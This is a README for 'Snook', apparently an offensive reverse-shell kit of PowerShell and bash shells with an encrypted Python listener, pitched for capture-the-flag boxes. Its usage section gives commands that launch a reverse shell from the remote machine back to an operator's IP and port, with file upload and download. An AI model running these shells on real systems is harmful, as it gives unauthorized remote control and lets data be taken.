# Snook

Enhanced PowerShell/bash reverse shell with python listener. This work was inspired by [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) and [Nishang's PowerShell reverse shell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).
This is a cool tool for CTF boxes as the reverse shells are coded in a scripting language that will surely be available on the boxes, therefore they won't be dependency problems.
Feel free to suggest or implement new commands!

## Dependencies

The python listener needs:

- alive-progress
- colorama
- cryptography

They all can be installed with pip.

The Powershell reverse shell has only been tested on PowerShell 5.1.
The bash reverse shell has only been tested on bash 5.0.16

## Features

- Execute commands
- Download a file from the remote host
- Upload a file to the remote host
- Communication encryption (only available with the bash reverse shell at the moment)
- Fully interactive mode (only available with the bash reverse shell at the moment)

## Usage

On your machine, set up the listener:

`python3 snook_listener.py -H <IP> -p <PORT>`

Then run the reverse shell on the remote machine:

`. .\snook.ps1 ; Invoke-Snook <IP> <PORT>` (on Windows)

or

`./snook.sh <IP> <PORT>` (on Linux)

## TODO

- Implement communication encryption for the PS reverse shell
- Implement fully interactive mode for the PS reverse shell
- Add an encrypt command with on/off switch
- Add new cool features
- Check if the Powershell reverse shell is compatible with other PS versions
- Check if the bash reverse shell is compatible with other bash versions
